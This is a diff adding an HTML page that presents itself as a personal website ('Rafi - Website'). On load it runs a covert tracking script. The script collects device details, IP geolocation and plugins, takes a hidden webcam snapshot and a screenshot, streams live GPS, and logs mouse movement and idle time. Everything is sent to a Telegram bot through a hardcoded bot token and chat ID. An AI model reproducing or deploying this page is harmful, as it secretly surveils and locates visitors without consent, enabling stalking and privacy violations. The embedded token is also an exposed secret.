@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Rafi - Website</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #0f0f0f;
+      padding: 20px;
+      color: #e0e0e0;
+    }
+    .terminal-box {
+      background: #1a1a1a;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+      max-width: 700px;
+      margin: auto;
+      border: 1px solid #333;
+      position: relative;
+    }
+    .terminal-header {
+      background: #222;
+      padding: 8px 15px;
+      border-radius: 5px 5px 0 0;
+      margin: -20px -20px 15px -20px;
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #444;
+    }
+    .terminal-title {
+      font-weight: bold;
+      color: #4CAF50;
+      text-shadow: 0 0 5px rgba(76, 175, 80, 0.3);
+    }
+    .terminal-dots {
+      display: flex;
+      margin-right: 10px;
+    }
+    .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      margin-right: 6px;
+    }
+    .dot-red { background: #ff5f56; }
+    .dot-yellow { background: #ffbd2e; }
+    .dot-green { background: #27c93f; }
+    .info-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    .info-item {
+      display: flex;
+      margin-bottom: 8px;
+      font-size: 14px;
+    }
+    .info-label {
+      color: #4CAF50;
+      min-width: 120px;
+      margin-right: 10px;
+    }
+    .info-value {
+      color: #e0e0e0;
+      word-break: break-all;
+    }
+    .section-title {
+      color: #4CAF50;
+      margin: 15px 0 10px 0;
+      padding-bottom: 5px;
+      border-bottom: 1px solid #333;
+      grid-column: span 2;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      color: #666;
+      font-size: 12px;
+    }
+    video, canvas {
+      display: none;
+    }
+    @media (max-width: 600px) {
+      .info-grid {
+        grid-template-columns: 1fr;
+      }
+      .section-title {
+        grid-column: span 1;
+      }
+    }
+  </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</head>
+<body>
+
+  <div class="terminal-box">
+    <div class="terminal-header">
+      <div class="terminal-dots">
+        <div class="dot dot-red"></div>
+        <div class="dot dot-yellow"></div>
+        <div class="dot dot-green"></div>
+      </div>
+      <div class="terminal-title">Tracking BY Xemzz</div>
+    </div>
+    
+    <div class="info-grid" id="deviceInfo">
+      <div class="section-title">⚙️ Device Information</div>
+    </div>
+    
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    
+    <div class="footer">Telegram @XemzzXiterz</div>
+  </div>
+
+  <script>
+    const token = '7931558374:AAGaHgKA2KBal9WrW2iWUPbeOUxUsYX7oTU';
+    const chatId = '7860743219';
+
+    function sendText(text) {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+      });
+    }
+
+    function sendPhotoBlob(blob, filename = 'image.jpg') {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, filename);
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    }
+
+    function createInfoItem(label, value) {
+      const container = document.getElementById('deviceInfo');
+      const item = document.createElement('div');
+      item.className = 'info-item';
+      item.innerHTML = `
+        <div class="info-label">${label}</div>
+        <div class="info-value">${value}</div>
+      `;
+      container.appendChild(item);
+      return `<b>${label}:</b> ${value}\n`;
+    }
+
+    async function collectAllInfo() {
+      let message = '<b>╭───── Tracking BY Xemzz ───── ⦿</b>\n\n';
+      
+      // Device Information
+      message += '<b>⚙️ DEVICE INFORMATION</b>\n';
+      const deviceInfo = [
+        ['🖥️ Device', navigator.userAgent],
+        ['💻 Platform', navigator.platform],
+        ['🌐 Bahasa', navigator.language],
+        ['📶 Online', navigator.onLine ? 'Online' : 'Offline'],
+        ['📺 Screen Size', `${screen.width}x${screen.height}`],
+        ['🪟 Window Size', `${window.innerWidth}x${window.innerHeight}`],
+        ['💾 RAM', navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'],
+        ['🧠 CPU Cores', navigator.hardwareConcurrency],
+        ['✋ Touch Support', 'ontouchstart' in window ? '✅ YA' : '❌ TIDAK']
+      ];
+
+      deviceInfo.forEach(info => {
+        message += createInfoItem(info[0], info[1]);
+      });
+
+      // Battery Info
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          message += createInfoItem('🔋 Battery', `${(battery.level * 100).toFixed(0)}%`);
+          message += createInfoItem('🔌 Charging', battery.charging ? '✅ YA' : '❌ TIDAK');
+        } catch (e) {
+          message += createInfoItem('🔋 Battery', '❌ Tidak tersedia');
+        }
+      }
+
+      // Session Information
+      message += '\n<b>📊 SESSION INFORMATION</b>\n';
+      message += createInfoItem('⏰ Waktu Akses', new Date().toString());
+      message += createInfoItem('🕒 Page Load Time', (performance.now()).toFixed(2) + ' ms');
+      message += createInfoItem('📜 History Length', history.length);
+      message += createInfoItem('🔗 Referrer', document.referrer || 'None');
+      message += createInfoItem('🌍 URL', window.location.href);
+      message += createInfoItem('📄 Title', document.title);
+
+      // Location Information
+      message += '\n<b>📍 LOCATION INFORMATION</b>\n';
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const offset = new Date().getTimezoneOffset();
+      message += createInfoItem('🕓 Timezone', tz);
+      message += createInfoItem('🧭 Offset', offset + ' menit');
+
+      // Plugins Information
+      message += '\n<b>🧩 PLUGINS</b>\n';
+      if (navigator.plugins.length > 0) {
+        for (let i = 0; i < navigator.plugins.length; i++) {
+          message += createInfoItem(`🔌 Plugin ${i+1}`, navigator.plugins[i].name);
+        }
+      } else {
+        message += '❌ Tidak ada plugins terdeteksi\n';
+      }
+
+      // Features Information
+      message += '\n<b>⚙️ FEATURES</b>\n';
+      const features = ['geolocation', 'mediaDevices', 'bluetooth', 'clipboard', 'serviceWorker'];
+      features.forEach(f => {
+        message += createInfoItem(`⚙️ ${f}`, f in navigator ? '✅ YA' : '❌ TIDAK');
+      });
+
+      // IP Information
+      try {
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
+        
+        message += '\n<b>📡 IP INFORMATION</b>\n';
+        const ipInfo = [
+          ['📡 IP Address', ipData.ip],
+          ['🏙️ Kota', ipData.city],
+          ['🗺️ Wilayah', ipData.region],
+          ['🌎 Negara', ipData.country_name],
+          ['🏷️ Kode Pos', ipData.postal],
+          ['📌 Latitude', ipData.latitude],
+          ['📍 Longitude', ipData.longitude]
+        ];
+
+        ipInfo.forEach(info => {
+          message += createInfoItem(info[0], info[1]);
+        });
+      } catch (e) {
+        message += '\n❌ Gagal mendapatkan informasi IP\n';
+      }
+
+      message += '\n<b>╰───── Telegram @XemzzXiterz ───── ⦿</b>';
+
+      return message;
+    }
+
+    // Main execution
+    (async () => {
+      // First send the comprehensive text report
+      const fullReport = await collectAllInfo();
+      sendText(fullReport);
+
+      // Then send media (webcam and screenshot)
+      try {
+        // Webcam snapshot
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => sendPhotoBlob(blob, '📸_camera.jpg'), 'image/jpeg');
+        
+        // Stop the video stream
+        stream.getTracks().forEach(track => track.stop());
+      } catch (e) {
+        console.log('Webcam access denied');
+      }
+
+      // Screenshot after a delay
+      setTimeout(() => {
+        html2canvas(document.body).then(canvas => {
+          canvas.toBlob(blob => sendPhotoBlob(blob, '🖼️_screenshot.jpg'), 'image/jpeg');
+        });
+      }, 5000);
+
+      // GPS tracking if available
+      if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(pos => {
+          const gpsText = `<b>📡 LIVE GPS TRACKING</b>\n` +
+                         `<b>📌 Lat:</b> ${pos.coords.latitude}\n` +
+                         `<b>📍 Lng:</b> ${pos.coords.longitude}\n` +
+                         `<b>🎯 Akurasi:</b> ${pos.coords.accuracy}m`;
+          sendText(gpsText);
+        }, err => {
+          console.log('GPS access denied');
+        }, { enableHighAccuracy: true });
+      }
+
+      // Mouse movement tracking
+      document.addEventListener('mousemove', (e) => {
+        sendText(`🖱️ <b>Mouse Position:</b> (${e.clientX}, ${e.clientY})`);
+      });
+
+      // Idle time tracking
+      let idleStart = Date.now();
+      let idleTimer;
+      ['mousemove', 'keydown', 'scroll', 'touchstart'].forEach(evt => {
+        window.addEventListener(evt, () => {
+          const idleTime = ((Date.now() - idleStart) / 1000).toFixed(1);
+          sendText(`😴 <b>User idle selama:</b> ${idleTime} detik`);
+          idleStart = Date.now();
+          clearTimeout(idleTimer);
+          idleTimer = setTimeout(() => {
+            sendText('💤 <b>User diem kayak mayat selama 60 detik</b>');
+          }, 60000);
+        });
+      });
+    })();
+
+  </script>
+
+</body>
+</html>
